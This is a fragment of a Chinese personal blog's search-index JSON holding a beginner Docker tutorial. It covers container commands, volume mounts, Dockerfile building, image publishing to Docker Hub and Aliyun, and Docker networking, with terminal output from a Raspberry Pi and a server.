\"Cgroup\": \"\", \"Links\": null, \"OomScoreAdj\": 0, \"PidMode\": \"\", \"Privileged\": false, \"PublishAllPorts\": false, \"ReadonlyRootfs\": false, \"Se","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:9:4","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"进入当前正在运行的容器 docker exec -it 容器id bashshell docker ps # 方式一 进入容器之后开启一个新的终端(常用) docker exec -it id /bin/bash #方式二 进入执行的终端 docker attach 容器id 正在执行的代码。。。。。 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:9:5","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"从容器拷贝文件到主机 cp docker cp id:/home/test.java /home docker cp 容器id:容器目录 本机目录 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:9:6","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"作业一：部署nginx docker pull nginx #下载镜像 docker images docker run -d --name nginx-01 -p 3344:80 nginx #运行容器 curl localhost:3344 #测试 pi@raspberrypi:~ $ docker exec -it nginx-01 /bin/bash #进入容器 root@9ddb6ad99473:/# whereis nginx nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx root@9ddb6ad99473:/# cd etc/nginx/ root@9ddb6ad99473:/etc/nginx# ls conf.d fastcgi_params koi-utf koi-win mime.types modules nginx.conf scgi_params uwsgi_params win-utf pi@raspberrypi:~ $ docker stop nginx-01 #停止容器 nginx-01 pi@raspberrypi:~ $ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES #每次修改nginx配置，都需要进入容器，十分麻烦，映射路径，达到修改容器配置的目的，数据卷技术！！！！ ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:10:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"作业二：部署tomcat #官方使用 docker run -it --rm tomcat:9.0 #之前都是后台，停止了之后，容器还可以查到，docker run -it --rm用完即删，一般用来测试 #下载启动 docker pull tomcat docker images docker run -d --name tomcat-01 -p 3355:8080 tomcat #运行 外部3355 but 原因：官方镜像最简化，所以找不到资源文件： docker exec -it tomcat-01 /bin/bash #进入容器 cp -r webapps.dist/* webapps ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:11:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"作业三：部署es+kibana # elasticsearch暴露端口十分多 # ES 十分耗内存 # 数据一般挂载在安全目录 # --net somenetwork ？网络配置 docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" elasticsearch:7.11.2 docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" elasticsearch:7.11.2 C:\\Users\\26505\u003ecurl localhost:9200 { \"name\" : \"2ab0292e5b49\", \"cluster_name\" : \"docker-cluster\", \"cluster_uuid\" : \"661wGGJlSRqiLH_ht2P48A\", \"version\" : { \"number\" : \"7.11.2\", \"build_flavor\" : \"default\", \"build_type\" : \"docker\", \"build_hash\" : \"3e5a16cfec50876d20ea77b075070932c6464c7d\", \"build_date\" : \"2021-03-06T05:54:38.141101Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.7.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } # 启动之后非常卡 how to 解决 docker stats 查看cpu状态 docker stats # 解决一：增加内存限制，修改配置文件， -e 环境的配置修改 docker run -d --name elasticsearch -p 9201:9200 -p 9301:9300 -e \"discovery.type=single-node\" -e ES_JAVA_OPTS=\"-Xms64m -Xmx512m\" elasticsearch:7.11.2 使用kibana连接ES： ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:12:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"可视化工具 portainer(不是最佳选择，先用) # -v /var/run/docker.sock 挂载，里面数据挂载到本机 # --privileged=true 授权，本机可访问 docker run -d -p 8088:9000 \\ --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer 测试访问：8088 Rancher（CI/CD） docker镜像原理 UFS 联合文件系统，分层轻量，分层下载，分层加载，多镜像共用 公共内核(bootfs) 对于一个OS，rootfs可以很小，只需要包含基本的命令、工具和程序库就可以了，因为底层直接用host的kernel，自己只需要提供rootfs就可以了，由此可见，不同版本的Linux发行版，bootfs是相同的，只是rootfs不同罢了。 bootfs引导启动非常慢，rootfs库启动非常快，所以虚拟机启动分钟级别，docker启动秒级。 分层理解： ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:13:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"如何打包一个自己的镜像：commit docker commit #提交容器 docker commit -m=\"提交描述信息\" -a=\"作者\" 容器id 目标镜像名:[tag] docker commit -a=\"jd\" -m=\"add webapps\" 7sssdvhfgs tomcat02:1.0 容器数据卷 如果数据都在容器中，容器删除之后，数据就会丢失，需求：数据可持久化， MySQL，容器删除了，MySQL数据就没了，MySQL可以保存在本地吗？ 数据共享技术，docker容器中产生的数据同步到本地， 卷技术，？目录挂载，将容器内的目录挂载在宿主机上，持久化与同步操作，容器间数据可以共享 # 方式一：使用-v挂载 docker run -d -v 主机目录:容器目录 docker run -it -v /home/ceshi:/home --name ubuntu01 ubuntu /bin/bash docker inspect 容器id docker stop 1bfb0a3ad95e #停止docker 容器 sudo nano test.txt #修改Host文件 docker start 1bfb0a3ad95e #重新启动 # 进入容器查看文件变化 pi@raspberrypi:~ $ docker exec -it 1bfb0a3ad95e /bin/bash root@1bfb0a3ad95e:/# cd /home root@1bfb0a3ad95e:/home# ls test test.b test.java test.txt root@1bfb0a3ad95e:/home# cat test/txt cat: test/txt: No such file or directory root@1bfb0a3ad95e:/home# cat test.txt yasethbitgejk nadeuioaguhno arezln # 容器内的数据依旧是同步的！！！！！！ # 通过-v挂载配置文件和资源文件，就不用进入容器修改，只用修改本地，容器自动同步 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:14:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"部署MySQL mysql数据持久化问题 docker pull mysql:5.7 #需要配置密码 -e MYSQL_ROOT_PASSWORD=my-secret-pw # docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag docker run -d -p 3310:3306 --name mysql-test -v H:\\myNotsBooks\\docker\\conf:/etc/mysql/conf.d -v H:\\myNotsBooks\\docker\\data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7 链接成功： 数据挂载成功：（conf） 即使删除容器，本地的数据卷依旧没有丢失，这就达到了数据持久化 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:15:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"具名和匿名挂载 #匿名挂载 # -v 容器内路径！ docker run -d -P --name nginx-test -v /etc/nginx nginx # 查看所有卷volume的挂载情况 pi@raspberrypi:/home/ceshi $ docker run -d -P --name nginx-test -v /etc/nginx nginx 9f4ba2383cab2eedc09916c2191858b88673cc43ef85194b42eb67cb8c2bca54 pi@raspberrypi:/home/ceshi $ docker volume --help Usage: docker volume COMMAND Manage volumes Commands: create Create a volume inspect Display detailed information on one or more volumes ls List volumes prune Remove all unused local volumes rm Remove one or more volumes Run 'docker volume COMMAND --help' for more information on a command. pi@raspberrypi:/home/ceshi $ docker volume ls DRIVER VOLUME NAME local 27f1cec7789cd92096fc7177238808528b7201f2b7f2628c57fc4f350bff7c09 #匿名挂载 local 28ce6884130cf729f12f33decf67c96f0bab95032c193302553cd9050f8ff7e8 # -v 的时候只写了容器内部的路径 #具名挂载 pi@raspberrypi:~ $ docker run -d -P --name nginx-juming -v jumingfs:/etc/nginx nginx 70500d6c7b7f937a953990007fc0af3db4628df5687eead2081abdfaeb582b4f pi@raspberrypi:~ $ docker volume ls DRIVER VOLUME NAME local 27f1cec7789cd92096fc7177238808528b7201f2b7f2628c57fc4f350bff7c09 local 28ce6884130cf729f12f33decf67c96f0bab95032c193302553cd9050f8ff7e8 local jumingfs pi@raspberrypi:~ $ docker volume inspect nginx-juming [] Error: No such volume: nginx-juming pi@raspberrypi:~ $ docker volume inspect jumingfs [ { \"CreatedAt\": \"2021-03-25T11:06:02+08:00\", \"Driver\": \"local\", \"Labels\": null, \"Mountpoint\": \"/var/lib/docker/volumes/jumingfs/_data\", \"Name\": \"jumingfs\", \"Options\": null, \"Scope\": \"local\" } ] 所有docker容器内的卷，没有指定目录的情况下都是在/var/lib/docker/volumes/jumingfs/_data 我们通过具名挂载可以方便找到我们的一个大卷，大多数情况下使用的是具名挂载 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:16:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"如何区分是具名挂载还是匿名挂载还是指定路径挂载 -v 容器内路径 #匿名挂载 -v 卷名:容器内路径 #具名挂载 -v /宿主机路径:容器内路径 #指定路径挂载 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:17:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"扩展 #设置容器权限，对挂载数据卷有限制 docker run -d -P --name nginx-juming -v jumingfs:/etc/nginx:ro nginx docker run -d -P --name nginx-juming -v jumingfs:/etc/nginx:rw nginx # ro 只能通过宿主机来操作，不能通过容器内部操作 # 默认rw: 可读可写 Dockerfile:构建docker的文件 一段命令脚本 pi@raspberrypi:/home/docker-test-file-volume $ docker build -f ./dockerfile1 -t jd/centos:1.0 . #构建镜像 Sending build context to Docker daemon 2.048kB Step 1/4 : FROM ubuntu ---\u003e 3324772e8bdf Step 2/4 : VOLUME [\"volume01\",\"volume02\"] ---\u003e Running in e07670d15bd9 Removing intermediate container e07670d15bd9 ---\u003e 067080c3c46e Step 3/4 : CMD echo \"........end........\" ---\u003e Running in 0ac9ebb25a05 Removing intermediate container 0ac9ebb25a05 ---\u003e 5fa9a5e368ba Step 4/4 : CMD /bin/bash ---\u003e Running in 492dcb1825df Removing intermediate container 492dcb1825df ---\u003e e5bd1def5d82 Successfully built e5bd1def5d82 Successfully tagged jd/centos:1.0 pi@raspberrypi:/home/docker-test-file-volume $ docker images #查看镜像 REPOSITORY TAG IMAGE ID CREATED SIZE jd/centos 1.0 e5bd1def5d82 7 seconds ago 49.8MB portainer/portainer latest 9b438d60114e 6 days ago 62.4MB nginx latest 4f718772a0b3 13 days ago 103MB ubuntu latest 3324772e8bdf 5 months ago 49.8MB hello-world latest 851163c78e4a 14 months ago 4.85kB java 8 d23bdf5b1b1b 4 years ago 643MB pi@raspberrypi:/home/docker-test-file-volume $ cat dockerfile1 FROM ubuntu VOLUME [\"volume01\",\"volume02\"] #匿名挂载 CMD echo \"........end........\" CMD /bin/bash docker inspect id #查看卷挂载路径 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:18:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"多个docker同步数据 # 多个MySQL数据同步 # 启动三个容器 docker run -it --name docker01 jd/centos:1.0 docker run -it --name docker02 --volumes-from docker01 jd/centos:1.0 docker run -it --name docker03 --volumes-from docker01 jd/centos:1.0 # 进入docker01创建文件 root@450d606a17a0:/# pi@raspberrypi:/ $ docker attach 0721edbafafb root@0721edbafafb:/# ls bin dev home media opt root sbin sys usr volume01 boot etc lib mnt proc run srv tmp var volume02 root@0721edbafafb:/# cd vo bash: cd: vo: No such file or directory root@0721edbafafb:/# cd volume01 root@0721edbafafb:/volume01# ls root@0721edbafafb:/volume01# touch docker01.txt touch: setting times of 'docker01.txt': Operation not permitted root@0721edbafafb:/volume01# ls docker01.txt #进入docker02查看 pi@raspberrypi:/ $ docker attach 450d606a17a0 root@450d606a17a0:/# ls bin dev home media opt root sbin sys usr volume01 boot etc lib mnt proc run srv tmp var volume02 root@450d606a17a0:/# cd volume01 root@450d606a17a0:/volume01# ls docker01.txt docker02 volumesfrom docker01 docker03 volumesfrom docker01 如果把1删除了，2，3还在吗？？？ 发现还在，只要有一个容器使用，就依旧存在，共享备份机制，双向拷贝的概念 # 多个mysql实现数据共享 docker run -d -p 3301:3306 --name mysql01 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7 docker run -d -p 3302:3306 --name mysql02 --volumes-from mysql01 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7 #这个时候可以实现两个容器数据同步 结论： 容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止， 但是一旦持久化挂载-v到本地，本地不会被删除！！！！ ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:19:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"dockerfile 命令参数脚本 1、编写一个dockerfile文件 2、docker build 一个镜像 3、docker run 运行容器 4、docker push 发布镜像（dockerhub,阿里云镜像） 查看一下官方这么做的： FROM scratch ADD centos-8-x86_64.tar.xz / LABEL org.label-schema.schema-version=\"1.0\" org.label-schema.name=\"CentOS Base Image\" org.label-schema.vendor=\"CentOS\" org.label-schema.license=\"GPLv2\" org.label-schema.build-date=\"20201204\" CMD [\"/bin/bash\"] ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:20:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"构建过程 从上到下顺序执行，指令大写，每个指令就会创建一个新的镜像层 企业交付的标准！！！！！ ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:21:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"dockerfile指令 dockerHub 80% 来自FROM scratch FROM #基础镜像，一切从这里开始构建 MAINTAINER #镜像是谁写的，姓名+邮箱 RUN #构建镜像时需要运行的命令 ADD #步骤，tomcat压缩包，添加内容 WORKDIR #镜像的工作目录 VOLUME #挂载卷 EXPOSE #指定暴露端口原来-p CMD #指定这个容器启动的时候运行的命令，只有最后一个会失效，可被替代 ENTRYPOINT #指定这个容器启动的时候运行的命令，可追加 ONBUILD #当构建一个被继承dockerfile,触发指令 COPY #类似ADD，拷贝文件到镜像 ENV #构建的时候设置环境变量 -e 自己写一个dockerfile：：：：：：：：： ＃　entos-vim-ip FROM centos MAINTAINER 金东\u003c2650523664@qq.com ENV MYPATH /usr/local WORKDIR $MYPATH RUN yum -y install vim RUN yum -y install net-tools EXPOSE 80 CMD echo $MYPATH CMD echo \"------end-----\" CMD /bin/bash docker build -f centos-vim-ip -t mycentos:1.0 . docker images docker run -it --name mycentostest mycentos:1.0 # 现在vim 与 ifconfig命令都可以用了,官方不可用 docker history mycentos:1.0 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:22:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"CMD与ENTRYPOINT区别 FROM centos CMD [\"ls\",\"-a\"]　# 指定容器启动时运行的命令，只有最后一个生效，可被替代 H:\\myNotsBooks\\docker\\dockerfile\u003edocker run -it cmdtest -l docker: Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: exec: \"-l\": executable file not found in $PATH: unknown. # cmd的清理下，-l代替了CMD [\"ls\",\"-a\"],但是-l不是命令，所以报错 H:\\myNotsBooks\\docker\\dockerfile\u003edocker run -it cmdtest ls -al #这就对了 total 56 drwxr-xr-x 1 root root 4096 Mar 25 14:21 . drwxr-xr-x 1 root root 4096 Mar 25 14:21 .. -rwxr-xr-x 1 root root 0 Mar 25 14:21 .dockerenv lrwxrwxrwx 1 root root 7 Nov 3 15:22 bin -\u003e usr/bin drwxr-xr-x 5 root root 360 Mar 25 14:21 dev drwxr-xr-x 1 root root 4096 Mar 25 14:21 etc drwxr-xr-x 2 root root 4096 Nov 3 15:22 home lrwxrwxrwx 1 root root 7 Nov 3 15:22 lib -\u003e usr/lib lrwxrwxrwx 1 root root 9 Nov 3 15:22 lib64 -\u003e usr/lib64 drwx------ 2 root root 4096 Dec 4 17:37 lost+found drwxr-xr-x 2 root root 4096 Nov 3 15:22 media drwxr-xr-x 2 root root 4096 Nov 3 15:22 mnt drwxr-xr-x 2 root root 4096 Nov 3 15:22 opt dr-xr-xr-x 196 root root 0 Mar 25 14:21 proc dr-xr-x--- 2 root root 4096 Dec 4 17:37 root drwxr-xr-x 11 root root 4096 Dec 4 17:37 run lrwxrwxrwx 1 root root 8 Nov 3 15:22 sbin -\u003e usr/sbin drwxr-xr-x 2 root root 4096 Nov 3 15:22 srv dr-xr-xr-x 11 root root 0 Mar 25 14:21 sys drwxrwxrwt 7 root root 4096 Dec 4 17:37 tmp drwxr-xr-x 12 root root 4096 Dec 4 17:37 usr drwxr-xr-x 20 root root 4096 Dec 4 17:37 var #ENTRYPOINT 命令可追加 FROM centos ENTRYPOINT [\"ls\",\"-a\"] docker build -f docker-entrypoint-test -t entrypointtest . docker run -it entrypointtest H:\\myNotsBooks\\docker\\dockerfile\\cmd ENTRYPOINT\u003edocker run -it entrypointtest . .dockerenv dev home lib64 media opt root sbin sys usr .. bin etc lib lost+found mnt proc run srv tmp var H:\\myNotsBooks\\docker\\dockerfile\\cmd ENTRYPOINT\u003edocker run -it entrypointtest -l #加-l不报错,加到a前面了 total 56 drwxr-xr-x 1 root root 4096 Mar 25 14:29 . drwxr-xr-x 1 root root 4096 Mar 25 14:29 .. -rwxr-xr-x 1 root roo","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:22:1","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"实战：tomcat镜像 1、准备镜像文件：tomcat jdk 2、编写dockerfile文件 FROM centos MAINTAINER jd\u003c2650523664@qq.com\u003e COPY readme.txt /usr/local/readme.txt ADD apache-tomcat-9.0.44.tar.gz /usr/local/ ADD jdk-8u201-linux-x64.tar.gz /usr/local/ RUN yum -y install vim ENV MYPATH /usr/local WORKDIR $MYPATH ENV JAVA_HOME /usr/local/jdk1.8.0_201 ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.44 ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.44 ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin EXPOSE 8080 CMD /usr/local/apache-tomcat-9.0.44/bin/startup.sh \u0026\u0026 tail -F /usr/local/apache-tomcat-9.0.44/bin/logs/catalina.out 3、构建镜像 docker build -t mytomcat . # 构建镜像 4、启动镜像 docker run -d -p 9090:8080 --name testmytomcat -v /root/environment/tomcat-test-3-26/test:/usr/local/apache-tomcat-9.0.44/webapps/test -v /root/environment/tomcat-test-3-26/tomlogs:/usr/local/apache-tomcat-9.0.44/logs mytomcat 5、访问测试 6、发布项目（由于实现了卷挂载，所以我们就直接在本地写项目发布就可以了） jps页面 \u003chtml\u003e \u003chead\u003e\u003ctitle\u003eHello World\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e Hello World!\u003cbr/\u003e \u003c% System.out.println(\"-----------start my tomcat-----\"); %\u003e \u003c/body\u003e \u003c/html\u003e web.xml文件 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\" metadata-complete=\"true\"\u003e \u003c/web-app\u003e ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:23:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"发布镜像 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:24:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"dockerHub镜像 1、注册账户：https://registry.hub.docker.com/ 2、客户端提交镜像 [root@jd tomcat-test-3-26]# docker login --help Usage: docker login [OPTIONS] [SERVER] Log in to a Docker registry. If no server is specified, the default is defined by the daemon. Options: -p, --password string Password --password-stdin Take the password from stdin -u, --username string Username [root@jd tomcat-test-3-26]# docker login -u hubu8023 Password: WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded 3、发布镜像 [root@jd ~]# docker tag 5599ee6a7e53 hubu8023/mytest:1.0 [root@jd ~]# docker push hubu8023/mytest:1.0 [root@jd ~]# docker tag hello-world:latest hubu8023/myhello:2.0 #增加标签 [root@jd ~]# docker push hubu8023/myhello:2.0 # The push refers to repository [docker.io/hubu8023/myhello] f22b99068db9: Mounted from library/hello-world 2.0: digest: sha256:1b26826f602946860c279fce658f31050cff2c596583af237d971f4629b57792 size: 525 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:24:1","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"阿里云镜像 1、登录阿里云https://cr.console.aliyun.com/cn-hangzhou/instance/repositories 2、找到容器镜像服务 3、创建命名空间 4、创建容器镜像 5、浏览页面信息 登录阿里云Docker Registry $ sudo docker login --username=18871955259东 registry.cn-hangzhou.aliyuncs.com 用于登录的用户名为阿里云账号全名，密码为开通服务时设置的密码。 您可以在访问凭证页面修改凭证密码。 从Registry中拉取镜像 $ sudo docker pull registry.cn-hangzhou.aliyuncs.com/jda/testdockerjd:[镜像版本号] 将镜像推送到Registry $ sudo docker login --username=18871955259东 registry.cn-hangzhou.aliyuncs.com $ sudo docker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/jda/testdockerjd:[镜像版本号] $ sudo docker push registry.cn-hangzhou.aliyuncs.com/jda/testdockerjd:[镜像版本号] 请根据实际镜像信息替换示例中的[ImageId]和[镜像版本号]参数。 小结： Docker网络 docker网络核心docker0: 两个容器之间如何访问？？？？？ docker run -d -P --name tomcat01 tomcat [root@jd ~]# docker exec -it tomcat01 ip addr 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 18: eth0@if19: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever # 查看容器内网IP地址，发现容器启动的时候得到一个eth0@if19 IP地址，这是docker分配的！！！ 现在能不能ping通容器？？？linux可以ping通容器内部 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:24:2","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"原理： 1、我们每启动一个docker容器，docker就会给容器分配一个IP，我们只要安装了docker，就会有一个网卡docker0(桥接模式–evth-pair) 2、再启动一个docker容器，发现又多了一对网卡： # 容器的网卡都是成对出现的， # evth-pair就是一对虚拟设备接口，他们都是成对出现的，一端连接协议，一端彼此相连 # 正因为有这个特性，evth-pair充当一个桥梁，连接各种虚拟网络设备， 3、测试两个tomcat能不能互通： 网络模型 结论：tomcat01和tomcat02 共用一个路由器docker0, 所有的容器不指定网络，都是docker0路由的，docker会给容器分配一个默认可用IP 255.255.0.1/16 : 能用IP;255*255-0.0-255.255=255*255-1-1 255.255.0.1/24 : 能用IP;255*255-0.0-255.255=255-1-1 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:25:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"–link(基本不用) 场景：微服务或者springboot中database.url配置怎么写？？IP一直变 项目不重启，数据库IP变了，我们希望可以通过名字来访问容器 [root@jd ~]# docker exec -it tomcat02 ping tomcat01 ping: tomcat01: Name or service not known # 实现tomcat03 ping tomcat02 [root@jd ~]# docker run -d -P --name tomcat03 --link tomcat02 tomcat 7dd6fe9dbe2e5732dfa53d3d2b2e6f14eb7abaccbf2771c44ae03db2dcc4faaf [root@jd ~]# docker exec -it tomcat03 ping tomcat02 PING tomcat02 (172.17.0.3) 56(84) bytes of data. 64 bytes from tomcat02 (172.17.0.3): icmp_seq=1 ttl=64 time=0.109 ms 64 bytes from tomcat02 (172.17.0.3): icmp_seq=2 ttl=64 time=0.079 ms 64 bytes from tomcat02 (172.17.0.3): icmp_seq=3 ttl=64 time=0.100 ms # 反向tomcat02 不能ping tomcat03 [root@jd ~]# docker exec -it tomcat02 ping tomcat03 ping: tomcat03: Name or service not known 探究inspect: [root@jd ~]# docker network ls NETWORK ID NAME DRIVER SCOPE c592ad97632c bridge bridge local c9c57d03a4a4 host host local 85a3888c406a none null local [root@jd ~]# docker network inspect c592ad97632c #docker0网卡信息 docker inspect tomcat03 # 原理发现！！！！！！！！！！！！！！！！！！！！ # 查看tomcat03 hosts文件 docker exec -it tomcat03 cat /etc/hosts [root@jd ~]# docker exec -it tomcat03 cat /etc/hosts 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.3 tomcat02 9dce1424d4fe #9dce1424d4fe tomcat02容器id 172.17.0.4 7dd6fe9dbe2e #7dd6fe9dbe2e tomcat03本机容器id 容器02： [root@jd ~]# docker exec -it tomcat02 cat /etc/hosts 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.3 9dce1424d4fe 只要在这里增加容器03的网络配置就可以实现互通， 但是现在docker已经不建议使用–link技术了，自定义网络，不用docker0, docker0问题：他不支持容器名链接访问！ ！ ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:26:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"自定义网络 # 查看所有网络 [root@jd ~]# docker network ls NETWORK ID NAME DRIVER SCOPE c592ad97632c bridge bridge local c9c57d03a4a4 host host local 85a3888c406a none null local 网络模式： bridge : 桥接模式（默认），自己创建也是使用bridge模式 none: 不配置网络， host: 和Linux主机共享网络 container: 容器网络连通（用的少，局限性很大） 测试 # 原来启动容器，默认--net bridge 二这个就是我们的docker0 docker run -d -P --name tomcat01 --net bridge tomcat docker run -d -P --name tomcat01 tomcat # docker0特点： 默认。域名不能访问，--link可以打通 # 因此我们需要自定义一个网络 [root@jd ~]# docker network --help Usage: docker network COMMAND Manage networks Commands: connect Connect a container to a network create Create a network disconnect Disconnect a container from a network inspect Display detailed information on one or more networks ls List networks prune Remove all unused networks rm Remove one or more networks docker network create --help # --subnet子网地址 192.168.0.2--------192.168.255.255 # --gateway 网关，路由器地址 docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mytestnet docker network ls [root@jd ~]# docker network inspect mytestnet [ { \"Name\": \"mytestnet\", \"Id\": \"779b38cb0d482db5eb7156e0ba327da1740a86d71106438f27f22f6ceee2e82e\", \"Created\": \"2021-03-27T14:17:45.675341638+08:00\", \"Scope\": \"local\", \"Driver\": \"bridge\", \"EnableIPv6\": false, \"IPAM\": { \"Driver\": \"default\", \"Options\": {}, \"Config\": [ { \"Subnet\": \"192.168.0.0/16\", \"Gateway\": \"192.168.0.1\" } ] }, \"Internal\": false, \"Attachable\": false, \"Ingress\": false, \"ConfigFrom\": { \"Network\": \"\" }, \"ConfigOnly\": false, \"Containers\": {}, \"Options\": {}, \"Labels\": {} } ] 用自己创建的网络模式创建容器 [root@jd ~]# docker run -d -P --name tomcat-net-01 --net mytestnet tomcat 56554c258e04f1ed4c300e26d337ca39c35087aa4d92f782e0a2b87138484b99 [root@jd ~]# docker run -d -P --name tomcat-net-02 --net mytestnet tomcat 1ccb18d09020622d029b4373c6d09f40259b5944ee27269ee0195ad8bd94269 [root@jd ~]# docker network inspect mytestnet [ { \"Name\": \"mytestnet\", \"Id\": 